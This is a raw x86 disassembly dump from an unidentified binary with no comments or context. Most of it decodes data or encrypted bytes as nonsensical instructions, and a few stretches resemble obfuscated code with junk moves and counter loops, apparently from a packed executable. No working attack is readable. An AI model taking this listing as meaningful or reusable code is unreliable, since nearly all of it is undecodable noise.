  415d35:	xor    DWORD PTR [eax+0x43],edi
  415d38:	test   BYTE PTR [esi],cl
  415d3a:	xor    edx,eax
  415d3c:	(bad)  
  415d3d:	sti    
  415d3e:	in     al,dx
  415d3f:	iret   
  415d40:	mov    ecx,0x931a797b
  415d45:	clc    
  415d46:	ja     0x415d7e
  415d48:	pop    ss
  415d49:	fstp   DWORD PTR [edx-0xe]
  415d4c:	mov    al,BYTE PTR [ecx]
  415d4e:	jb     0x415d02
  415d50:	mov    edi,0x93b772f1
  415d55:	mov    eax,ds:0xa8df4cf8
  415d5a:	cmp    al,0x8e
  415d5c:	out    dx,eax
  415d5d:	shr    ah,1
  415d5f:	enter  0xcd6,0x27
  415d63:	int3   
  415d64:	mov    dl,BYTE PTR [edi-0x4b0a6428]
  415d6a:	and    DWORD PTR [edi-0x7b],edx
  415d6d:	addr16 (bad) 
  415d6f:	popf   
  415d70:	stos   BYTE PTR es:[edi],al
  415d71:	(bad)  
  415d72:	leave  
  415d73:	hlt    
  415d74:	cmp    esi,DWORD PTR [eax]
  415d76:	ror    DWORD PTR [eax-0x2b390e89],0x8f
  415d7d:	cs stos DWORD PTR es:[edi],eax
  415d7f:	les    edx,FWORD PTR [edi-0x37153fbd]
  415d85:	inc    ebp
  415d86:	fidiv  WORD PTR [edx-0x39a0bacd]
  415d8c:	daa    
  415d8d:	arpl   WORD PTR ds:0x45cd7cb6,si
  415d93:	ja     0x415d75
  415d95:	dec    DWORD PTR [eax-0x7b]
  415d98:	mov    eax,ds:0xa99363da
  415d9d:	add    DWORD PTR [eax],eax
  415d9f:	pop    ebp
  415da0:	inc    esi
  415da1:	pusha  
  415da2:	push   ecx
  415da3:	push   es
  415da4:	push   ss
  415da5:	inc    ebx
  415da6:	mov    esp,0x9a92ba1b
  415dab:	std    
  415dac:	push   cs
  415dad:	add    eax,0x4d96dae0
  415db2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415db3:	int    0x4e
  415db5:	xlat   BYTE PTR ds:[ebx]
  415db6:	or     eax,DWORD PTR [ebp+0x3]
  415db9:	or     esi,ebp
  415dbb:	scas   al,BYTE PTR es:[edi]
  415dbc:	add    DWORD PTR [esi-0x2f],edi
  415dbf:	iret   
  415dc0:	lods   eax,DWORD PTR ds:[esi]
  415dc1:	retf   0xce61
  415dc4:	xchg   esp,eax
  415dc5:	shl    DWORD PTR [ebx+0x19d2dfd8],1
  415dcb:	test   al,0x3e
  415dcd:	in     eax,0x75
  415dcf:	and    BYTE PTR [ecx+esi*4],dh
  415dd2:	sub    edi,DWORD PTR [esi+0x10d3cc93]
  415dd8:	ret    0x7111
  415ddb:	xor    BYTE PTR [esi],ch
  415ddd:	sub    eax,0x9233eab7
  415de2:	fidivr WORD PTR [edi+0x5b]
  415de5:	(bad)
  415de8:	out    dx,eax
  415de9:	push   ds
  415dea:	jno    0x415d9a
  415dec:	jbe    0x415e21
  415dee:	xchg   edx,eax
  415df0:	dec    DWORD PTR [edx+0x20e77e7]
  415df6:	push   ebp
  415df7:	jbe    0x415d95
  415df9:	imul   ebp,DWORD PTR [edi+0x32da1250],0x3a
  415e00:	xchg   ebp,eax
  415e01:	ins    BYTE PTR es:[edi],dx
  415e02:	pop    edi
  415e03:	mov    ds:0x314d19b,al
  415e08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e09:	dec    ebx
  415e0a:	scas   eax,DWORD PTR es:[edi]
  415e0b:	lods   eax,DWORD PTR ds:[esi]
  415e0c:	int3   
  415e0d:	xchg   ecx,eax
  415e0e:	mov    edx,0xa4a039e8
  415e13:	inc    ecx
  415e14:	push   edx
  415e15:	test   DWORD PTR [ebx],esp
  415e17:	mov    edx,0x22b2a2b4
  415e1c:	xchg   edi,eax
  415e1d:	mov    edi,0x414d4a80
  415e22:	mov    ds:0xcd9e2b56,al
  415e27:	mov    bh,0xb0
  415e29:	add    al,0x6d
  415e2b:	sub    ch,BYTE PTR [eax]
  415e2d:	iret   
  415e2e:	ret    
  415e2f:	mov    cl,ch
  415e31:	stc    
  415e32:	mov    eax,0x8d5b7446
  415e37:	nop
  415e38:	inc    esi
  415e39:	pop    esp
  415e3a:	into   
  415e3b:	mov    edi,0x97395c35
  415e40:	ja     0x415e25
  415e42:	and    BYTE PTR [esi-0x45],0xe4
  415e46:	nop
  415e47:	push   ecx
  415e48:	pop    ss
  415e49:	outs   dx,DWORD PTR ds:[esi]
  415e4a:	in     eax,dx
  415e4b:	xchg   edi,eax
  415e4c:	enter  0xa222,0x17
  415e50:	cld    
  415e51:	xor    cl,BYTE PTR [esi-0x66]
  415e54:	daa    
  415e55:	and    DWORD PTR [ebx-0x3dfa1b1],edi
  415e5b:	leave  
  415e5c:	or     eax,0x837c9cb4
  415e61:	or     al,0xe
  415e63:	push   edi
  415e64:	sub    al,0x4a
  415e66:	sti    
  415e67:	xchg   edi,eax
  415e68:	lds    esi,FWORD PTR [eax-0x22]
  415e6b:	mov    ds:0xc9d38130,eax
  415e70:	in     eax,dx
  415e71:	xchg   esp,eax
  415e72:	push   eax
  415e73:	out    dx,al
  415e74:	push   ds
  415e75:	pop    ebx
  415e76:	sub    BYTE PTR [edx-0x4f],cl
  415e79:	jnp    0x415e50
  415e7b:	xchg   edx,eax
  415e7c:	rcl    BYTE PTR [ebp+ebp*1+0x6d72b2e8],0x61
  415e84:	fst    DWORD PTR [ebx+0x212223c9]
  415e8a:	or     BYTE PTR [ebp-0x3c],ch
  415e8d:	in     al,0x79
  415e8f:	pop    eax
  415e90:	xchg   ebp,eax
  415e91:	push   edi
  415e92:	jno    0x415ef0
  415e94:	(bad)  
  415e95:	jns    0x415e67
  415e97:	in     al,0xf4
  415e99:	xor    DWORD PTR [edx-0x2],eax
  415e9c:	test   al,0x72
  415e9e:	nop
  415e9f:	mov    al,0xc0
  415ea1:	xchg   esi,eax
  415ea2:	xchg   BYTE PTR [eax-0x79],ch
  415ea5:	mov    dl,0xbd
  415ea7:	popf   
  415ea8:	pop    ss
  415ea9:	jmp    0x415e95
  415eab:	fisttp DWORD PTR [edx+0x43baa822]
  415eb1:	inc    esp
  415eb2:	jl     0x415ea6
  415eb4:	dec    edx
  415eb5:	jp     0x415ef7
  415eb7:	mov    edx,0x69648443
  415ebc:	xor    eax,0xc8253a21
  415ec1:	and    BYTE PTR [esi-0x5ffd39e6],ah
  415ec7:	mov    cl,0x3f
  415ec9:	and    BYTE PTR [ebp-0x3d2b2335],bl
  415ecf:	pop    eax
  415ed0:	xchg   esi,eax
  415ed1:	scas   al,BYTE PTR es:[edi]
  415ed2:	or     al,0x66
  415ed4:	xor    eax,0x2b5aa54
  415ed9:	jb     0x415ed7
  415edb:	stc    
  415edc:	dec    esi
  415edd:	lods   al,BYTE PTR ds:[esi]
  415ede:	dec    eax
  415edf:	push   ecx
  415ee0:	push   0x19
  415ee2:	sar    DWORD PTR [ecx+0x45897c0f],cl
  415ee8:	clc    
  415ee9:	mov    DWORD PTR ds:0x42a77d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a801,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a805,0x42a7c1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	mov    cl,0x78
  415f4c:	dec    edi
  415f4d:	or     DWORD PTR [edi],esp
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415f9b
  415f57:	mov    cl,0x0
  415f59:	cli    
  415f5a:	jg     0x415f6c
  415f5c:	mov    edx,0xda5f3c07
  415f61:	test   DWORD PTR ds:[eax],eax
  415f64:	jne    0x415fc4
  415f66:	fcmovbe st,st(3)
  415f68:	in     eax,0x74
  415f6a:	adc    DWORD PTR [ebx+0x35715240],edi
  415f70:	mov    es,WORD PTR [ecx-0x318db5b5]
  415f76:	adc    al,BYTE PTR [edx+0x22]
  415f79:	push   ebp
  415f7a:	std    
  415f7b:	pop    esi
  415f7c:	gs mov edi,0xd293310b
  415f82:	jbe    0x415fb6
  415f84:	mov    edi,0xde9a94ae
  415f89:	cmc    
  415f8a:	push   cs
  415f8b:	sub    eax,0x7f6a9e26
  415f90:	xchg   edi,eax
  415f91:	fucomi st,st(5)
  415f93:	fs loope 0x415f68
  415f96:	leave  
  415f97:	outs   dx,DWORD PTR ds:[esi]
  415f98:	xor    ebx,DWORD PTR [esi-0x920e6b0]
  415f9e:	xchg   ecx,eax
  415f9f:	gs test eax,0xea28003a
  415fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fa6:	xor    dh,BYTE PTR [esi]
  415fa8:	or     BYTE PTR [ebx],ah
  415faa:	jle    0x415f93
  415fac:	add    al,0x88
  415fae:	scas   eax,DWORD PTR es:[edi]
  415faf:	sti    
  415fb0:	pop    ecx
  415fb1:	jmp    0x7d8b:0x4cde71fa
  415fb8:	loopne 0x415f8c
  415fba:	les    ebp,FWORD PTR [edx+0x314024a8]
  415fc0:	inc    ebp
  415fc1:	mov    DWORD PTR [edx-0x26],ecx
  415fc4:	mov    ds:0x2ddbc2b6,al
  415fc9:	into   
  415fca:	pop    ds
  415fcb:	mov    ebx,0x2563b8a3
  415fd0:	pushf  
  415fd1:	sbb    eax,0x4e646f93
  415fd6:	inc    edx
  415fd7:	lds    edi,FWORD PTR [esi+edx*2+0x47783732]
  415fde:	jo     0x416014
  415fe0:	test   bl,bl
  415fe2:	rol    DWORD PTR [ebx-0x19652853],0xab
  415fe9:	jb     0x415f99
  415feb:	in     eax,0x49
  415fed:	push   edi
  415fee:	sar    DWORD PTR [ecx+0x689e08cd],0xf0
  415ff5:	cdq    
  415ff6:	fadd   QWORD PTR [ebx+0x7ec315a9]
  415ffc:	or     esp,DWORD PTR [edi+0x18562a1c]
  416002:	fisttp QWORD PTR [ebx-0x380f74f4]
  416008:	adc    DWORD PTR [ebx-0x10],esp
  41600b:	cmp    ah,BYTE PTR [edx]
  41600d:	inc    eax
  41600e:	lods   eax,DWORD PTR ds:[esi]
  41600f:	xor    DWORD PTR [ecx-0x69d2c501],edi
  416015:	mov    WORD PTR [edx],ss
  416017:	sti    
  416018:	add    ebp,0xfffffff3
  41601b:	sub    BYTE PTR ds:0x1dc0c754,0xe0
  416022:	test   DWORD PTR [edi],ebp
  416024:	(bad)  
  416025:	sbb    cl,BYTE PTR [edx+0x22316846]
  41602b:	adc    DWORD PTR [esi+0x98f653d],eax
  416031:	push   0x50
  416033:	xchg   ecx,eax
  416034:	inc    esi
  416035:	rcl    BYTE PTR [ecx+0x16],0xfc
  416039:	or     DWORD PTR [edx+ebp*2+0x49],eax
  41603d:	mov    edi,0xe396d8fd
  416042:	call   0xe27b37a4
  416047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416048:	enter  0xe97,0x98
  41604c:	sbb    dh,BYTE PTR [edi]
  41604e:	loopne 0x416009
  416050:	int3   
  416051:	or     BYTE PTR [ebp-0x7e6b927a],al
  416057:	inc    eax
  416058:	and    DWORD PTR [eax-0x69],0x3f
  41605c:	add    eax,0x9db0271f
  416061:	jae    0x41609d
  416063:	cli    
  416064:	loop   0x41606d
  416066:	or     eax,DWORD PTR ds:0xc3163dea
  41606c:	pop    edx
  41606d:	cmc    
  41606e:	call   0x2467:0x22bddbca
  416075:	mov    dl,bh
  416077:	xchg   ecx,eax
  416078:	push   ss
  416079:	or     dh,BYTE PTR [ebp-0x43418ab9]
  41607f:	aad    0xfb
  416081:	pop    ds
  416082:	xchg   edx,eax
  416083:	call   0x6d94d430
  416088:	push   ds
  416089:	xchg   edx,eax
  41608a:	add    esi,DWORD PTR [ecx-0x50f5b2c1]
  416090:	pop    ebx
  416091:	scas   al,BYTE PTR es:[edi]
  416092:	pop    ebx
  416093:	adc    edx,DWORD PTR [edi+0x39]
  416096:	jnp    0x41603e
  416098:	nop
  416099:	push   esi
  41609a:	dec    eax
  41609b:	sub    BYTE PTR [edx-0x604edba4],al
  4160a1:	dec    edx
  4160a2:	jb     0x41609f
  4160a4:	dec    ebx
  4160a5:	push   ecx
  4160a6:	shl    BYTE PTR [esi+0x5e],1
  4160a9:	mov    DWORD PTR [edi-0xc],esp
  4160ac:	sub    eax,0x8b1d7952
  4160b1:	push   ds
  4160b2:	jb     0x4160e3
  4160b4:	push   edx
  4160b5:	mov    ds:0x86a0a44a,eax
  4160ba:	mov    dl,0x81
  4160bc:	jnp    0x4160c2
  4160be:	repnz or eax,0xce5a9711
  4160c4:	cdq    
  4160c5:	mov    ah,0x25
  4160c7:	nop
  4160c8:	aam    0xca
  4160ca:	sti    
  4160cb:	mov    esp,0xebfd5339
  4160d0:	xchg   ebx,ecx
  4160d2:	mov    ecx,0x977e1801
  4160d7:	xchg   ebx,eax
  4160d8:	iret   
  4160d9:	mov    eax,0x3eb5a22f
  4160de:	(bad)
  4160e1:	sar    DWORD PTR [eax],0x8b
  4160e4:	sub    BYTE PTR [esi-0x8],cl
  4160e7:	fwait
  4160e8:	(bad)
  4160eb:	jnp    0x4160dc
  4160ed:	sahf   
  4160ee:	cmp    cl,BYTE PTR [edx]
  4160f0:	push   edx
  4160f1:	iret   
  4160f2:	mov    esp,0x8316025a
  4160f7:	jmp    0x9e320773
  4160fc:	rcl    BYTE PTR [esi-0x49],1
  4160ff:	out    0xd1,eax
  416101:	in     eax,dx
  416102:	push   ds
  416103:	fdivr  QWORD PTR [edx]
  416105:	xchg   edx,eax
  416106:	jns    0x416106
  416108:	pop    eax
  416109:	loope  0x4160a1
  41610b:	jno    0x416176
  41610d:	jne    0x4160bf
  41610f:	push   esp
  416110:	xchg   esi,eax
  416111:	mov    al,ds:0x653b49af
  416116:	pusha  
  416117:	fisub  DWORD PTR [eax]
  416119:	inc    edx
  41611a:	fadd   QWORD PTR [ebx+0x7]
  41611d:	retf   
  41611e:	lods   al,BYTE PTR ds:[esi]
  41611f:	xchg   BYTE PTR [eax],al
  416121:	rcr    BYTE PTR [eax+ecx*4+0x41],1
  416125:	loope  0x416130
  416127:	xor    dl,ah
  416129:	jmp    0x8382:0xd2972926
  416130:	mov    ch,0x45
  416132:	mov    ebx,0x9ced31d7
  416137:	dec    esi
  416138:	sahf   
  416139:	imul   BYTE PTR [eax+0x69]
  41613c:	lock out dx,eax
  41613e:	add    eax,0xc75842cb
  416143:	retf   
  416144:	je     0x41616d
  416146:	jae    0x4160ef
  416148:	xchg   ebx,eax
  416149:	js     0x4160ea
  41614b:	imul   edi,DWORD PTR [edx],0x7f7cb41f
  416151:	and    al,0x21
  416153:	sar    ch,1
  416155:	jno    0x4160de
  416157:	push   ebp
  416158:	inc    esp
  416159:	adc    eax,0x256c17f8
  41615e:	xor    DWORD PTR [esi+0x2ab4d4e3],esi
  416164:	scas   al,BYTE PTR es:[edi]
  416165:	xchg   esi,eax
  416166:	(bad)  
  416167:	push   0x65b8abb9
  41616c:	ror    DWORD PTR [ebx+ebp*8-0x2be77969],1
  416173:	or     DWORD PTR [edx+0x51],0x6f0f1d2d
  41617a:	push   eax
  41617b:	xchg   ecx,eax
  41617c:	mov    ds:0xe0c9257,al
  416181:	out    0x10,al
  416183:	or     BYTE PTR ds:0x687c08a0,bh
  416189:	push   esp
  41618a:	xchg   ebx,eax
  41618b:	retf   
  41618c:	int    0xc2
  41618e:	dec    edi
  41618f:	jne    0x4161ea
  416191:	pop    ds
  416192:	cld    
  416193:	dec    edx
  416194:	or     edi,esi
  416196:	loop   0x4161a6
  416198:	dec    ebp
  416199:	in     al,dx
  41619a:	stos   BYTE PTR es:[edi],al
  41619b:	sbb    BYTE PTR [edi+ebx*8-0x7d],ah
  41619f:	mov    ecx,ecx
  4161a1:	les    eax,FWORD PTR ds:0xdcd1362f
  4161a7:	push   0x74
  4161a9:	test   dh,ah
  4161ab:	jp     0x4161dd
  4161ad:	mov    DWORD PTR [esi+0x2f],ebp
  4161b0:	sub    bl,BYTE PTR [ebx+0x66]
  4161b3:	clc    
  4161b4:	mov    DWORD PTR [edx-0x29],edi
  4161b7:	data16 ins BYTE PTR es:[edi],dx
  4161b9:	lds    ebp,FWORD PTR [ecx-0x6aa0771]
  4161bf:	test   BYTE PTR [edi-0x16af4125],bl
  4161c5:	push   esp
  4161c6:	jo     0x4161d0
  4161c8:	dec    eax
  4161c9:	dec    edi
  4161ca:	xor    bh,BYTE PTR [eax-0x11]
  4161cd:	in     eax,0xff
  4161cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161d0:	icebp  
  4161d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161d2:	stc    
  4161d3:	mov    dh,0xbc
  4161d5:	cmp    DWORD PTR [esi-0x80],ebp
  4161d8:	cmc    
  4161d9:	(bad)  
  4161db:	adc    al,0xd
  4161dd:	mov    fs,edx
  4161df:	push   ebp
  4161e0:	loope  0x416189
  4161e2:	inc    esp
  4161e3:	mov    edx,0x3d7e5936
  4161e8:	sub    cl,BYTE PTR [ecx-0x7be87d88]
  4161ee:	xor    DWORD PTR [eax],edi
  4161f0:	mov    ecx,DWORD PTR [ebx+0x5c7fc45]
  4161f6:	lea    ebp,[eax+0x1c0042]
  4161fc:	add    BYTE PTR [eax],al
  4161fe:	cmp    DWORD PTR ds:0x42a88d,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a88d,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a88d,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a88d
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a88d,edx
  416249:	mov    edx,DWORD PTR ds:0x42a88d
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a88d,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a769,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a841,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x497f8a46]
  416290:	(bad)  
  416291:	mov    esp,0x95787f18
  416296:	jle    0x416310
  416298:	js     0x416274
  41629a:	adc    ebp,DWORD PTR [ecx-0x2]
  41629d:	dec    eax
  41629e:	addr16 out dx,al
  4162a0:	xlat   BYTE PTR ds:[ebx]
  4162a1:	stos   BYTE PTR es:[edi],al
  4162a2:	retf   
  4162a3:	repz out 0x34,al
  4162a6:	stos   BYTE PTR es:[edi],al
  4162a7:	loop   0x41629d
  4162a9:	pop    ds
  4162aa:	xchg   ebp,eax
  4162ab:	sbb    ah,BYTE PTR [edi]
  4162ad:	mov    ds:0x6c643696,eax
  4162b2:	pop    ds
  4162b3:	fimul  DWORD PTR [edx]
  4162b5:	loope  0x4162db
  4162b7:	jle    0x416296
  4162b9:	sti    
  4162ba:	jl     0x416308
  4162bc:	pop    esi
  4162bd:	jmp    0x416298
  4162bf:	into   
  4162c0:	repnz xor DWORD PTR [edx+ecx*4],0x7820fc9d
  4162c8:	enter  0x77c0,0x40
  4162cc:	or     ecx,DWORD PTR [ebp-0x630eb7cd]
  4162d2:	adc    eax,0x2a3031d1
  4162d7:	call   0x8e46:0x57bf7180
  4162de:	cmp    al,0x91
  4162e0:	adc    al,0xf5
  4162e2:	into   
  4162e3:	add    BYTE PTR [edx],ch
  4162e5:	xchg   DWORD PTR [esi-0x48],eax
  4162e8:	sub    bl,BYTE PTR [esi-0x5d]
  4162eb:	call   0x1caa:0x62241da0
  4162f2:	rcl    BYTE PTR [edx+0x1e],cl
  4162f5:	cmp    al,0x38
  4162f7:	outs   dx,BYTE PTR ds:[esi]
  4162f8:	fisubr DWORD PTR [ebp+0x408d9ec0]
  4162fe:	jno    0x416372
  416300:	ret    
  416301:	mov    eax,0x2058847b
  416306:	ss push edx
  416308:	out    0x82,eax
  41630a:	call   0xd553abf6
  41630f:	mov    eax,0x94bebb9
  416314:	fwait
  416315:	inc    edi
  416316:	jns    0x4162cb
  416318:	arpl   si,dx
  41631a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41631b:	push   ss
  41631c:	ins    DWORD PTR es:[edi],dx
  41631d:	lock pop edx
  41631f:	adc    bh,BYTE PTR [ebp+0x1f]
  416322:	mov    ?,WORD PTR [bx+di]
  416325:	xchg   ebx,eax
  416326:	jg     0x4163a3
  416328:	in     eax,dx
  416329:	mov    al,0x0
  41632b:	mov    BYTE PTR [edx],dl
  41632d:	out    dx,al
  41632e:	les    ebp,FWORD PTR ds:0xb1f29c78
  416334:	dec    ecx
  416335:	jno    0x416309
  416337:	sti    
  416338:	ins    BYTE PTR es:[edi],dx
  416339:	mov    ebx,0xde031499
  41633e:	mov    BYTE PTR [ecx+0x34],ah
  416341:	xor    eax,0x89260666
  416346:	and    al,0x34
  416348:	push   ebx
  416349:	adc    eax,0x1964de83
  41634e:	aaa    
  41634f:	push   esp
  416350:	pop    edi
  416351:	xchg   edi,eax
  416352:	mov    ebx,DWORD PTR [edi+0x634c0c3c]
  416358:	inc    esi
  416359:	mov    esp,0x15e49387
  41635e:	into   
  41635f:	cmp    al,0x2e
  416361:	pusha  
  416362:	stos   DWORD PTR es:[edi],eax
  416363:	mov    dl,0x26
  416365:	popf   
  416366:	add    eax,0x1d490b5c
  41636b:	ja     0x4163e3
  41636d:	in     eax,0x83
  41636f:	es test eax,0x7c3f828c
  416375:	mov    dh,0x90
  416377:	fiadd  WORD PTR [ebx-0x3d]
  41637a:	mov    edx,0x9167ae66
  41637f:	mov    al,ds:0x72da1c45
  416384:	jmp    0xae10:0x2f6f1a6f
  41638b:	ja     0x416349
  41638d:	loop   0x41637a
  41638f:	inc    ebp
  416390:	sbb    ebp,DWORD PTR [ebp-0xf]
  416393:	sbb    dl,al
  416395:	pop    ecx
  416396:	jge    0x416415
  416398:	cmp    edi,DWORD PTR [eax+0x10]
  41639b:	call   0x21bf7215
  4163a0:	shr    BYTE PTR [edi-0x7dce9f89],cl
  4163a6:	sbb    BYTE PTR [ebp+0x1ceea8d4],0x6
  4163ad:	or     ebx,DWORD PTR [edi]
  4163af:	cmp    al,0xd
  4163b1:	xor    BYTE PTR [edi-0x69e8e755],ch
  4163b7:	dec    edi
  4163b8:	stos   BYTE PTR es:[edi],al
  4163b9:	inc    ebx
  4163ba:	mov    al,ah
  4163bc:	and    eax,ebx
  4163be:	shr    BYTE PTR [eax+0x315bea7b],cl
  4163c4:	cmp    ebx,DWORD PTR [ecx]
  4163c6:	test   eax,0x6486a29e
  4163cb:	pop    edx
  4163cc:	jmp    0x46d9:0x93bbb42f
  4163d3:	loopne 0x416439
  4163d5:	scas   eax,DWORD PTR es:[edi]
  4163d6:	pop    ebx
  4163d7:	repnz mov ds:0x63f0c915,al
  4163dd:	add    BYTE PTR [ebx+0xdaaef80],dl
  4163e3:	retf   
  4163e4:	retf   0xe3f9
  4163e7:	and    ah,BYTE PTR [esi+edx*4]
  4163ea:	cmp    DWORD PTR ds:0xd9d24e01,0x2c
  4163f1:	or     al,0x20
  4163f3:	leave  
  4163f4:	ds sbb ebp,edi
  4163f7:	(bad)  
  4163f9:	daa    
  4163fa:	mov    di,0x474a
  4163fe:	cmp    dh,BYTE PTR [ecx-0x58]
  416401:	pop    ebx
  416402:	adc    DWORD PTR [ecx-0x55],ebx
  416405:	je     0x41645f
  416407:	(bad)  
  416408:	cmc    
  416409:	(bad)  
  41640a:	pushf  
  41640b:	mov    dh,0x70
  41640d:	mov    dh,0x14
  41640f:	pop    eax
  416410:	dec    esi
  416411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416412:	mov    esi,0x8143994b
  416417:	fld    QWORD PTR [edi+0x2a]
  41641a:	xor    DWORD PTR [eax+0x61],0xfffffff4
  41641e:	xchg   dh,bh
  416420:	scas   eax,DWORD PTR es:[edi]
  416421:	shl    BYTE PTR [edx-0x5259d93e],0xee
  416428:	dec    eax
  416429:	xor    al,0xba
  41642b:	repz adc al,0x20
  41642e:	aaa    
  41642f:	sahf   
  416430:	int    0xd5
  416432:	stos   DWORD PTR es:[edi],eax
  416433:	pop    esi
  416434:	dec    ecx
  416435:	push   ss
  416436:	dec    ecx
  416437:	adc    BYTE PTR [ebp+0x387c190f],ch
  41643d:	(bad)
  416440:	sbb    al,0xf2
  416442:	cmp    esi,DWORD PTR [ebp+0x1d]
  416445:	mov    eax,ds:0x20734b0b
  41644a:	mov    bl,0xdf
  41644c:	int3   
  41644d:	add    ch,dl
  41644f:	inc    ecx
  416450:	mov    DWORD PTR [edi-0x78ffce07],ebp
  416456:	jae    0x41643c
  416458:	mov    gs,WORD PTR [ecx]
  41645a:	push   cs
  41645b:	jmp    0x41643d
  41645d:	sahf   
  41645e:	adc    dh,BYTE PTR [esi+ebp*2-0x31]
  416462:	cmp    eax,0x8b5fcce2
  416467:	repz cmp BYTE PTR [edx-0x42],cl
  41646b:	adc    eax,0x4ab7c7b2
  416470:	retf   
  416471:	sahf   
  416472:	push   ebp
  416473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416474:	sub    DWORD PTR [edx+0x1ce74b4b],0x9ff2c1a2
  41647e:	sbb    BYTE PTR [esi],ah
  416480:	pop    edi
  416481:	lahf   
  416482:	(bad)  
  416483:	sbb    BYTE PTR [ecx-0x3b],ah
  416486:	mov    ds:0xf78a46c8,al
  41648b:	pop    ds
  41648c:	pop    edi
  41648d:	fbstp  TBYTE PTR [eax]
  41648f:	popa   
  416490:	cmp    al,0x40
  416492:	pop    ecx
  416493:	in     eax,0x1e
  416495:	xor    esi,ecx
  416497:	sqrtps xmm0,XMMWORD PTR [ebx-0x70a3990b]
  41649e:	or     bl,BYTE PTR [edx+0x60]
  4164a1:	ret    
  4164a2:	fdivr  QWORD PTR [eax]
  4164a4:	rcr    DWORD PTR [esi],cl
  4164a6:	inc    eax
  4164a7:	inc    esi
  4164a8:	add    eax,0x941766f2
  4164ad:	cmp    DWORD PTR [ebp+ebp*4+0x34a1ff70],0xaccf7d7f
  4164b8:	fst    st(5)
  4164ba:	div    DWORD PTR [eax+0x6e]
  4164bd:	ja     0x41647e
  4164bf:	cmp    DWORD PTR [edi+0x3a62db4d],edx
  4164c5:	out    0xd5,eax
  4164c7:	jno    0x41652c
  4164c9:	stc    
  4164ca:	icebp  
  4164cb:	jl     0x4164a5
  4164cd:	inc    ebx
  4164ce:	enter  0x9964,0xb9
  4164d2:	shl    BYTE PTR [ebp-0x1e],0x67
  4164d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164d7:	clc    
  4164d8:	ss jmp 0x416533
  4164db:	sbb    al,0xfa
  4164dd:	loope  0x4164b7
  4164df:	sub    DWORD PTR [eax+eax*2],0x44df604a
  4164e6:	mov    ?,WORD PTR [eax-0x5f]
  4164e9:	sbb    eax,0x710747f4
  4164ee:	(bad)  
  4164ef:	sbb    ch,al
  4164f1:	sbb    eax,0x31d1b943
  4164f6:	imul   edx,DWORD PTR [ecx],0xffffffeb
  4164f9:	dec    edx
  4164fa:	jp     0x4164e7
  4164fc:	fwait
  4164fd:	mov    al,0xb6
  4164ff:	mov    ecx,0x34321a98
  416504:	xchg   esi,eax
  416505:	sti    
  416506:	mov    ah,0x86
  416508:	fs jp  0x41657b
  41650b:	mul    BYTE PTR [eax]
  41650d:	xor    eax,0x197bdb2e
  416512:	loop   0x4164a0
  416514:	push   ecx
  416515:	add    bl,al
  416517:	mov    bh,0xe1
  416519:	dec    eax
  41651a:	or     eax,0x8891a2ea
  41651f:	loopne 0x41650b
  416521:	psraw  mm4,mm4
  416524:	add    al,0x75
  416526:	pop    ecx
  416527:	leave  
  416528:	ja     0x416566
  41652a:	jmp    0x4164f1
  41652c:	inc    DWORD PTR [ebp+ebx*8-0x34c6ec5f]
  416533:	cdq    
  416534:	call   0x417d6b
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp-0x301c839a],cl
  416557:	arpl   WORD PTR [edi-0x22],bp
  41655a:	fstp   DWORD PTR ds:0x7e95787f
  416560:	js     0x4165da
  416562:	mov    esi,0xa0644aad
  416567:	sar    esi,1
  416569:	jg     0x4164f3
  41656b:	test   al,0x56
  41656d:	inc    edi
